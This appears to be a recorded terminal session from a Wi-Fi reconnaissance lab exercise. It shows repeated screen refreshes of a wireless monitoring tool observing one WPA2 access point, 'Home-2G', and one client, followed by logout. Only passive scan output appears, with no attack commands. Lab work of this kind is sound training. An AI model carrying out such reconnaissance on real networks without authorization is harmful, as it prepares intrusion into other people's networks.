+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       34       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       35       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       35       12    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       12                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       36       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       37       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       37       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       38       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       39       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       39       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       40       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       41       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       41       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       42       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       43       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       43       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       44       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       45       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       45       16    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       16                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       46       20    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       47       20    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       47       20    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       48       20    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       49       20    5   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       49       20    3   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       50       20    3   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       51       20    3   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       51       20    3   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       52       20    3   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       53       20    3   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[2;1H[22m[37m CH  6 ][ Elapsed: 0 s ][ 2026-09-26 15:39 [0K
+[0K[1B BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID[0K
+[0K[1B F0:9F:C2:71:22:12  -28   0       53       20    3   6   54   WPA2 CCMP   PSK  Home-2G                                [0K
+[0K[1B BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes[0K
+[0K[1B F0:9F:C2:71:22:12  28:6C:07:6F:F9:43  -29   54 -54      0       20                                                    [0K
+[0J[?25hQuitting...
+[?25h[?2004h]0;user@ip-10-81-132-106: ~[01;32muser@ip-10-81-132-106[00m:[01;34m~[00m$ exit
+[?2004llogout
+Connection to wi.fi.fundamentals.and.reconnaissance.thm closed.
+
+Script done on 2026-09-26 16:40:37+03:00 [COMMAND_EXIT_CODE="0"]
